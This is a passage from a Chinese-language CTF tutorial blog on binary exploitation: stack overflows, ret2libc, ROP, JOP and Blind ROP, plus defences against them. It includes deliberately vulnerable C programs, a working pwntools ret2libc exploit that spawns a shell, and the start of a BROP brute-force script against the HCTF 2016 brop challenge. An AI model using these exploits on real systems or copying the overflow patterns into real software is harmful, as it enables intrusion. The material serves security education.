<p>&emsp;其它的危险函数包括 strcpy、strcat、sprintf 等字符串拷贝函数，可能造成溢出，可以使用 strncpy、strncat、snprintf 等来代替，这些函数都有 size 参数用于限制长度。</p>
<p>&emsp;两种栈溢出的利用方式：shellcode 注入与 ret2libc 两种方式。</p>
<ul>
<li>shellcode 注入。没有 NX 的时候，可以将 shellcode 写到栈上。padding1 使用任意数据即可，一直覆盖到调用者的 ebp，然后在返回地址处填充上 shellcode 的地址，当函数返回时，就会跳到 shellcode 的位置。如果开启了 ASLR，使 shellcode 的地址不确定，那么可以使用 NOP 作为 padding2。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240524211745884.png" alt="image-20240524211745884" style="zoom:80%;" /></p>
<ul>
<li>ret2libc。开启 NX 后，就需要使用 ret2libc 来调用 libc.so 中的 system(“/bin/sh”)。返回地址覆盖上 system 函数的地址，padding2 为其添加一个伪造的返回地址，长度为 4 字节。紧接着放上 “bin/sh” 字符串的地址。如果开启了 ASLR，那么 system 和 “/bin/sh” 的地址就变成随机的，此时需要先做内存泄露，再填充真实地址。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240524212119929.png" alt="image-20240524212119929" style="zoom:80%;" /></p>
<h3 id="返回导向编程-ROP"><a href="#返回导向编程-ROP" class="headerlink" title="返回导向编程 ROP"></a>返回导向编程 ROP</h3><p>&emsp;最开始，栈溢出的利用方式：<code>将返回地址覆盖为 jmp esp 指令的地址（esp 此时为 shellcode 的地址），并在后面添加 shellcode 就可以执行。</code>引入 NX 后，shellcode 注入不可行，于是用 ret2libc。ret2libc 的缺陷为：<code>攻击者一个接一个地调用 libc 中的函数，但执行流是线性的，不像 shellcode 注入那样任意执行，其次，攻击者只能使用程序 text 段和 libc 中已有的函数，通过移除特定的函数就可以限制此类攻击。</code></p>
<p>&emsp;于是就有了 ROP。<code>扫描文件，提取出可用的 gadget （通常以 ret 指令结尾），然后将这些 gadget 根据所需要的功能进行组合，达到攻击者的目的</code>。以 exit(0) 为例：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240524220002838.png" alt="image-20240524220002838" style="zoom:80%;" /></p>
<p>&emsp;要实现 exit(0) 的效果，就要找到很多符合条件的 gadget，组成链：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240524220323646.png" alt="image-20240524220323646" style="zoom:80%;" /></p>
<p>&emsp;需要找到这些以 ret 结尾，且在执行时必然以 ret 结束而不会跳到其他地方的 gadget，相应算法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">扫描文件找到 ret(0xc3)，将其作为根节点，然后回溯解析前面的指令，如果是有效指令，将其添加为子节点，再判断是否 boring，如果不是，就继续递归回溯。例如，若 pop %eax 的节点是 ret 的根节点的子节点，则 gadget 为 pop %eax; ret。boring 指令则分为三种:</span><br><span class="line">（1）该指令是 leave，后面是 ret</span><br><span class="line">（2）该指令是 pop %ebp，后跟 ret</span><br><span class="line">（3）该指令是返回或者非条件跳转</span><br></pre></td></tr></table></figure>
<p>&emsp;Gadget 的用法举例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）保存栈数据到寄存器，弹出栈顶数据到寄存器中，然后跳转到新的栈顶地址。例如 pop eax; ret;</span><br><span class="line">（2）保存内存数据到寄存器。例如 mov ecx, [eax]; ret;</span><br><span class="line">（3）保存寄存器数据到内存。例如 mov [eax], ecx; ret;</span><br><span class="line">（4）算数和逻辑运算，例如 add、sub、mul、xor 等。例如：add eax, ebx; ret; xor edx, edx; ret;</span><br><span class="line">（5）系统调用，执行内核中断。例如 int 0x80; ret; call gs:[0x10]; ret;</span><br><span class="line">（6）影响栈帧的 gadget。gadget 会改变 ebp 的值，从而影响栈帧，在一些操作如 stack pivot（栈转移）时需要这样的指令来转移栈帧。例如 leave; ret; pop ebp; ret;</span><br></pre></td></tr></table></figure>
<p>&emsp;正常程序的指令流执行和 ROP 的指令流有很大不同，主要有两点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. ROP 执行流包含很多 ret 指令</span><br><span class="line">2. ROP 利用 ret 来改变执行流，而不是使用正常的函数调用和返回</span><br></pre></td></tr></table></figure>
<p>&emsp;检测 ROP 程序的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 程序执行中是否有频繁 ret 的指令</span><br><span class="line">2. 可以通过 call 和 ret 的配对情况来判断异常</span><br><span class="line">3. 维护影子栈（shadow stack）作为正常栈的备份，每次 ret 的时候就与正常栈对比一下</span><br><span class="line">4. 直接在编译器层面重写二进制文件，消除 ret 指令</span><br><span class="line"></span><br><span class="line">注：堆栈展开（unwind stack）是指通过 ret 从堆栈中弹出返回地址，并将程序执行流跳转到该地址</span><br></pre></td></tr></table></figure>
<p>&emsp;这些防御技术的前提是：<code>ROP 中必定存在 ret</code>。因此，就诞生了不依赖于 ret 指令的 ROP 变种。原始 ROP 技术中，ret 指令的作用主要有 2 个：<code>通过间接跳转改变执行流，另一个是更新寄存器状态</code>。</p>
<p>&emsp;x86 和 ARM 中的某些指令序列（update-load-branch）也能完成 ret 指令的作用，其逻辑为：<code>更新全局状态（如栈指针），之后根据更新后的状态加载下一条指令的地址，并跳转过去执行</code>，例如 <code>pop eax; jmp eax</code>、<code>jmp [esp]</code>、<code>call xxx</code>。update-load-branch 可以当作跳板（trampoline）使用。使用 update-load-branch 的 ROP 链如下所示（就是将 ret 的功能都让 trampoline 做了）：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240525231146642.png" alt="image-20240525231146642" style="zoom:80%;" /></p>
<p>&emsp;大多数这样的 gadget 都使用 jmp，称为 JOP（Jump-Oriented Programming），例如 <code>pop %eax; jmp *%eax</code>，其与 ret 很相似，只是将 eip 改为了 eax。还有双重间接跳转，例如<code>pop %eax; jmp *(%eax)</code>。此时，eax 存放 sequence catalog 表的地址，该表用于存放各种指令序列的地址（类似于 GOT 表）。双间接跳转先从上一段指令序列跳到 catalog 表，然后从 catalog 表跳到下一段指令序列。<code>这使得 ROP 链的构造更加便捷，可以根据偏移来实现跳转</code>。如下所示：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240525233252016.png" alt="image-20240525233252016" style="zoom: 80%;" /></p>
<h4 id="ROP-的简单例子"><a href="#ROP-的简单例子" class="headerlink" title="ROP 的简单例子"></a>ROP 的简单例子</h4><p>&emsp;ROP 的 payload 由触发栈溢出的 padding 、多个 gadget 与参数组成（参数常用于 pop 指令，来设置寄存器的值）。内存布局如下所示：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240525233738067.png" alt="image-20240525233738067" style="zoom:67%;" /></p>
<p>Step1：书中是 libc-2.23，环境中是 libc-2.31，因此需要编译新的 glibc：</p>
<p>&emsp;下载并安装编译旧版本 glibc 的工具 binutils-2.25：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/binutils/binutils-2.25.tar.gz</span><br><span class="line">tar -xzf binutils-2.25.tar.gz</span><br><span class="line">cd binutils-2.25</span><br><span class="line">./configure --prefix=/opt/binutils-2.25</span><br><span class="line">make -j4</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>&emsp;切换为使用旧版本的 binuntils 编译 glibc（如果要切换回来，把这两个路径改了就行）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/opt/binutils-2.30/bin:$PATH</span><br><span class="line">export LD_LIBRARY_PATH=/opt/binutils-2.30/lib:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>
<p>&emsp;安装并切换到 gcc-7：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 添加 gcc-7 版本</span><br><span class="line">sudo apt-get install gcc-7 g++-7</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-7 70</span><br><span class="line">sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-7 70</span><br><span class="line"># 使用此命令切换版本</span><br><span class="line">sudo update-alternatives --config gcc</span><br><span class="line">sudo update-alternatives --config g++</span><br></pre></td></tr></table></figure>
<p>&emsp;编译 glibc-2.23：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz</span><br><span class="line">tar -zxvf glibc-2.23.tar.gz</span><br><span class="line">cd glibc-2.23</span><br><span class="line"></span><br><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line">export CFLAGS=&quot;-O2 -Wno-error&quot;</span><br><span class="line">export CXXFLAGS=&quot;-O2 -Wno-error&quot;</span><br><span class="line">../configure --prefix=/usr/local/glibc-2.23 --enable-debug=yes</span><br><span class="line">make -j4 &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
<p>&emsp;一直出错，我真是操了。之后打算安装 ubuntu16 的 docker，来使用 glibc2.23。首先创建 Dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y build-essential wget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>&emsp;之后创建 docker 镜像 <code>docker build -t ubuntu16.04-glibc2.23 .</code>，并运行 docker 容器 <code>docker run -it ubuntu16.04-glibc2.23 /bin/bash</code>。使用 exit 可以离开容器。</p>
<p>Step2：给一个示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  <span class="comment">// 对底层操作系统服务的访问，包括文件操作、进程管理、系统控制等</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span>   <span class="comment">// 定义了一组用于动态加载共享库（动态链接库）的函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 立即解析所有符号，且将这些符号放入到全局符号表</span></span><br><span class="line">    <span class="type">void</span> *handle = <span class="built_in">dlopen</span>(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line">    <span class="comment">// 找到 system 符号的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, <span class="built_in">dlsym</span>(handle, <span class="string">&quot;system&quot;</span>));</span><br><span class="line">    <span class="built_in">vuln_func</span>();</span><br><span class="line">    <span class="comment">// 在标准输出中展示 Hello World!\n</span></span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello World!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -fno-stack-protector -z noexecstack -no-pie -fno-pie example.cc -ldl -o rop64</span></span><br><span class="line"><span class="comment">// ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.23.so --only &quot;pop|ret&quot; | grep rdi</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/ctf-guide-pwn-2/image-20240527144723954.png" alt="image-20240527144723954" style="zoom:67%;" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./rop64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line">libc_addr = system_addr - libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_addr = libc_addr + <span class="number">0x0000000000021112</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">136</span> + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Blind-ROP（BROP）"><a href="#Blind-ROP（BROP）" class="headerlink" title="Blind ROP（BROP）"></a>Blind ROP（BROP）</h3><p>&emsp;能够在无法获得二进制程序的情况下，基于远程服务崩溃与否（连接是否中断），进行 ROP 攻击，可用于开启 ASLR、NX 和 canaries 的 64 位 Linux。</p>
<p>&emsp;传统 ROP 通过逆向从二进制文件里提取可用的 gadgets，而 BROP 无须获得二进制文件，但要满足 2 个条件：<code>（1）目标程序存在栈溢出漏洞，并且可以稳定触发。（2）目标进程在崩溃后会立即重启，并且重启后的进程内存不会重新随机化（即重启时不使用 execve），这样即使目标机器开启了 ASLR 也没有影响。如果启用 PIE，则服务器必须是一个 fork 服务器。</code>因此有防御方案：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）同时开启 ASLR 和 PIE，并在程序重启时重新随机化内存地址空间以及 canaries，例如 execve</span><br><span class="line">（2）程序发生段错误后延迟复刻新进程，降低攻击者的暴力枚举速度</span><br><span class="line">（3）通用 ROP 防御措施，例如控制流完整性 CFI</span><br></pre></td></tr></table></figure>
<p>&emsp;BROP 主要流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Step1：Stack reading。泄露 canaries 和返回地址，从返回地址可以推算出程序的加载地址，用于 gadgets 的扫描。泄露的方法是遍历 256 个数，每次溢出一个字节，根据程序是否崩溃来判断溢出值是否正确，就可以得到 canaries 和返回地址。</span><br><span class="line"></span><br><span class="line">Step2：BlindROP。远程搜索 gadgets，包括但不限于 write、puts 等函数，syscall、call、jmp 指令，修改寄存器的 gadgets。搜索 gadgets 的思路是基于溢出返回地址后判断程序是否崩溃。从加载地址开始，每次给返回地址加 1，大多数时候是一个非法地址，导致程序崩溃。但某些时候，程序会被挂起，例如进入无限循环、sleep 或 read，此时连接不会中断，我们将这些指令片段称为 stop gadgets。将 stop gadgets 放到 ROP 链的最后，就可以防止程序崩溃，利于其他 gadgets 的搜索。</span><br><span class="line"></span><br><span class="line">举个例子，如果覆盖的返回地址是指令 &#x27;pop rdi; ret&#x27;，那么在 ret 时，从栈里弹出返回地址，就可能导致崩溃，但如果栈里放着 stop gadget，那么程序就会挂起。有了 stop gadgets，就可以搜索和判断 gadgets 的行为，从而推断某个 gadgets 是否是我们需要的，具体还得看实例。</span><br><span class="line"></span><br><span class="line">Step3：Build exploit。利用得到的 gadgets 构造 ROP，BROP 就转换成了普通的 ROP。</span><br></pre></td></tr></table></figure>
<h4 id="HCTF-2016：brop"><a href="#HCTF-2016：brop" class="headerlink" title="HCTF 2016：brop"></a>HCTF 2016：brop</h4><p>Step1：题目部署。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stderr,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">check</span>())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Do not dump my memory&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No password, no game&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -z noexecstack -fno-stack-protector -no-pie main.c -o brop</span></span><br></pre></td></tr></table></figure>
<p>&emsp;要求程序崩溃时快速重启，因此使用以下脚本模拟环境：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># 持续检查系统中 socat 进程的数量，如果少于5个，就启动一个新的 socat 进程</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">	num=`ps -ef | grep <span class="string">&quot;socat&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | <span class="built_in">wc</span> -l`</span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$num</span> -lt 5 ]; <span class="keyword">then</span></span><br><span class="line">		socat tcp4-listen:10001, reuseaddr, fork <span class="built_in">exec</span>:./brop &amp;</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>&emsp;使用 nc 127.0.0.1 10001 可以与其交互。</p>
<p>Step2：猜测此题目是否是一个栈溢出。假设我们已知这个题考的是 BROP，因此有解题思路：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）逐字节增加进行爆破，直到程序崩溃，从而找到返回地址，进而找到程序起始点。</span><br><span class="line">（2）寻找 stop gadget、其它有用的 gadget（例如 pop rdi; ret）。</span><br><span class="line">（3）找到用于内存转储的函数（例如 puts 或 writes）。</span><br><span class="line">	（a）转储程序内存。需要注意的是，由于 puts 函数会被 0x00 截断，并且在每一次输出末尾会加上换行符 \x0a，所以有一些特殊情况需要处理。首先，去掉末尾自动添加的 \n，如果收到单独一个 \n，说明此处内存为 \x00，如果收到 \n\n，则此处内存是 \x0a，使用了超时是因为函数本身的设定，在接收 \n\n 时，它很可能收到第一个 \n 就返回了，加上超时可以让它全部接收完。拿到二进制文件后，使用 radare2 打开转储文件，可以得到 puts@got 的地址。</span><br><span class="line">（4）到这一步相当于拿到了二进制文件，但缺少 libc。解决办法是调用 puts 打印出保存在 puts@got 里的 put 的实际内存地址，然后在 libc-database 里查询匹配的 libc.so 版本，进而计算得到 system 和 /bin/sh 的偏移。</span><br><span class="line">（5）调用 system(&quot;/bin/sh&quot;) 获得 shell。</span><br></pre></td></tr></table></figure>
<p>&emsp;注1：在使用 stop gadget 来找其它有用的 gadget 的过程中。可以通过在栈上摆放不同顺序的 stop gadget 与 trap 从而来识别出正在执行的指令。因为执行 stop 意味着程序不会崩溃，执行 trap 意味着程序会立即崩溃。例如：</p>
<ul>
<li>probe, stop, trap, trap…。可以找到不会对栈进行 pop 操作的 gadget，例如 <code>ret</code>、<code>xor eax,eax; ret</code>。</li>
<li>probe, trap, stop, trap…。找到只是弹出一个栈变量的 gadget，例如 <code>pop rax; ret</code>、<code>pop rdi; ret</code>。</li>
<li>probe, trap, trap, trap, trap, trap, trap, stop, traps。找到弹出 6 个栈变量的 gadget，也叫做 brop gadget。</li>
</ul>
<p>&emsp;注2：brop gadget 通常是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5d                      pop    rbp</span><br><span class="line">41 5c                   pop    r12</span><br><span class="line">41 5d                   pop    r13</span><br><span class="line">41 5e                   pop    r14</span><br><span class="line">41 5f                   pop    r15</span><br><span class="line">5f                      pop    rdi （偏移为 0x9）</span><br><span class="line">c3                      ret</span><br></pre></td></tr></table></figure>
<p>&emsp;注3：BROP 找到 put@plt 的方法：判断 0x400000 是否为 \x7fELF。</p>
<p>Step2：写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump code and data</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_io</span>():</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;password?\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到栈溢出的大小</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_buffer_size</span>():</span><br><span class="line">    <span class="comment"># 假设 buffer 的大小一定小于 100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * i</span><br><span class="line">        buf_size = <span class="built_in">len</span>(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            io.send(payload)</span><br><span class="line">            io.recv()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: %d&quot;</span> % buf_size)</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;buffer size: %d&quot;</span> % (buf_size-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> buf_size-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找无限循环、sleep 或 read 的 gadget，此时连接不会中断</span></span><br><span 